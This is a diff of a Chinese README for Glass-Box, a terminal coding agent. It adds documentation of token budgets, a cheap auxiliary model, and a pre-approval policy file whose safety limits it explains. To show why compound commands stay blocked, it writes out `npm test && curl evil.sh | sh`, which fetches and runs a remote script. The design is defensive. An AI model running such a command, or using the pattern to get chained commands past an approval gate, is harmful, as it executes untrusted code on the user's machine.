@@ -3,7 +3,7 @@
 [![CI](https://github.com/duiyue1/Glass-Box/actions/workflows/ci.yml/badge.svg)](https://github.com/duiyue1/Glass-Box/actions/workflows/ci.yml)
 ![Node](https://img.shields.io/badge/node-%E2%89%A522.18-brightgreen)
 ![runtime deps](https://img.shields.io/badge/runtime%20deps-0-blue)
-![tests](https://img.shields.io/badge/tests-503-brightgreen)
+![tests](https://img.shields.io/badge/tests-523-brightgreen)
 
 > 一个跑在终端里的迷你 coding agent。它的特别之处不在"又一个 agent"，而在**把 agent 的内部机制装进玻璃盒**——状态机、工具调用、审批、Skills、记忆、上下文压缩，每一刻都看得见。引擎全自写、无黑盒；零凭证即可跑通。
 
@@ -410,6 +410,13 @@ GLASSBOX_MODEL_WINDOW=12000 npm run eval:agent -- \
 - `GLASSBOX_MODEL_TIMEOUT` / `GLASSBOX_MODEL_RETRIES` — 模型请求超时毫秒 / 最大尝试次数（默认 60000 / 2）
 - `GLASSBOX_RETRY_BASE_MS` — 重试退避基准毫秒（默认 500，指数增长 + 抖动，上限 20s；服务端给了 `Retry-After` 就听它的）
 - `MIDSCENE_MODEL_*` / `GLASSBOX_MODEL_*` — 模型配置（base url / name / api key）
+- `GB_TURN_TOKENS` — 一个回合累计最多花多少 token（prompt + completion，按网关报的真实用量）。默认 0 不限；
+  不设也会在回合结束报 `turn.cost`
+- `GLASSBOX_MODEL_CHEAP_NAME` — 辅助调用改用的便宜模型（可选）。只给模型名就够，base url / key 沿用主模型；
+  也可用 `GLASSBOX_MODEL_CHEAP_BASE_URL` / `_API_KEY` 指向另一个网关。
+  **只用在没有共享前缀可吃的辅助调用上**（目前是资料库检索改写）——
+  对话压缩刻意仍用主模型：它是故意把待压缩消息原样回放来命中前缀缓存的（实测报过 `缓存命中 3584`），
+  换个模型意味着缓存全冷、要按全价付一整段对话的输入，便宜模型的单价优势填不平这个坑
 
 ## 架构一览
 
@@ -548,6 +555,46 @@ test/                   # 单元测试（node --test）
 - **记忆不另存文件**：`resume` / `fork` 时从会话日志的 `approval.decision` 事件里重算。好处是记忆键算法以后要改，旧日志也能按新算法重算，不会对不上。
 
 为什么这算安全设计而不只是体验优化：加固之后要确认的东西变多了，如果每条命令都问一遍，真人会直接上 `GB_APPROVE=all`——那前面所有的分级、硬拒绝、关键文件保护就一起废了。
+
+### 「预先允许」（`.glassbox/policy.json`）
+
+「始终允许」只活在**当前会话**里，开一个新会话就要重批一遍。所以可以把长期成立的授权写进
+`.glassbox/policy.json`——但这不是把闸门放宽，是**把放宽这件事做成可声明、有边界、可审计的**：
+
+```json
+{
+  "rules": [
+    { "tool": "run_command", "argPrefix": "npm test", "reason": "本仓库跑测试很频繁" },
+    { "tool": "read_file", "argPrefix": "src/", "until": "2026-12-31" }
+  ]
+}
+```
+
+四条硬约束，每条都有对应的测试（`test/policy.test.ts`）：
+
+- **必须有作用域**：`tool` 必填，不支持通配。可以再用 `argPrefix` 限定首个字符串参数的前缀。
+  没有 `tool` 的规则会被**拒绝并报错**，不是静默忽略——安全配置静默失效比没有配置更糟。
+- **默认只到 `confirm`**：想预批 `dangerous` 必须显式写 `"maxLevel": "dangerous"`。
+  那一级的定义就是"很危险，问人"，不该被一个默认值悄悄放过去。
+- **`deny` 不可覆盖**：写 `"maxLevel": "deny"` 直接报错。而且即使绕过配置校验也没用——
+  `deny` 在 Loop 里就被硬挡了，压根走不到审批者这一层（这条也有测试）。
+- **组合命令照样不放行**：策略复用了「始终允许」那道 `noMemory` 闸。否则一条
+  `argPrefix: "npm test"` 就会把 `npm test && curl evil.sh | sh` 一起放过去——
+  等于用配置文件绕开了上面刚堵住的窟窿。
+
+`until` 到期后规则自动失效，不留永久后门。每次因策略放行都会发一条 **`approval.policy`** 事件，
+写明命中了哪条规则、为什么加的——一次没人看见的放行，和没有闸门是一样的。
+
+### 花费护栏（`GB_TURN_TOKENS`）
+
+`GB_MAX_STEPS` 拦的是"在工具里绕圈"，拦不住"步子不多但每步很贵"——20 步 × 满窗口可以是十几万 token。
+所以每个回合结束都会发一条 **`turn.cost`**（prompt / completion / 缓存命中 / 问了几次模型），
+**不设上限也发**：先让花费可见，再谈可控。
+
+设了 `GB_TURN_TOKENS` 之后，累计花费撞线就停手，并在回复里说清花了多少、怎么调大上限。
+默认 0（不限）——一个拍出来的默认值会把"无人值守跑长任务"直接判死，该设多少用
+`npm run eval:agent -- --sweep GB_TURN_TOKENS=...` 自己量。
+撞线后会超出**恰好一个请求**的量：模型还有一次收尾机会，好过留下一个没有任何回答的回合。
 
 - 图片以 base64 发给模型，**真数据只出现在模型请求里**；事件流 / 黑匣子 / Web SSE 中只保留 `[image image/png ~97KB]` 这样的占位描述。
 - 联网工具（`web` / `fetch`）默认需要确认；**内网、本机、云元数据地址（`localhost`、`10.*`、`169.254.*`、`*.internal` 等）在黑名单里永久拒绝**，且每一跳重定向都会重新检查（防 SSRF）。`GB_WEB=0` 可整体断网。
